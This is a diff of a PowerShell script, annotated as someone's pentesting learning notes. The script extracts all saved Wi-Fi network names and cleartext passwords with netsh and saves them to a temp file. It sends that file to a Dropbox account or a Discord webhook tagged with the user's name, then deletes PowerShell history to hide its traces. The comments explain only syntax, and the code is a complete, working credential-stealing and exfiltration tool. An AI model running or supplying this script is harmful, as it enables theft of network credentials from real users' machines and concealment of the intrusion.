@@ -1,10 +1,17 @@
+#  This is Jakobys Code. 
+#  Pentesting
+### My own learning Notes 
+
+### Grab Wifi information
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
-
+### Set to Vartiable to send 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 # Upload output file to Dropbox
 
+
+###  Set Function
 function DropBox-Upload {
 
 [CmdletBinding()]
@@ -28,9 +35,11 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
 
 ############################################################################################################################################################
-
+### Set Function 
 function Upload-Discord {
 
+
+###Create Parameters
 [CmdletBinding()]
 param (
     [parameter(Position=0,Mandatory=$False)]
@@ -38,14 +47,15 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
+###Set Variables
 $hookurl = "$dc"
 
+###Set Array for Discord Variables
 $Body = @{
   'username' = $env:username
   'content' = $text
 }
-
+###Set "If" statement to check for empty parameters
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
@@ -58,13 +68,8 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-
 
 ############################################################################################################################################################
 
+#clean your presence
 function Clean-Exfil { 
-
-# empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
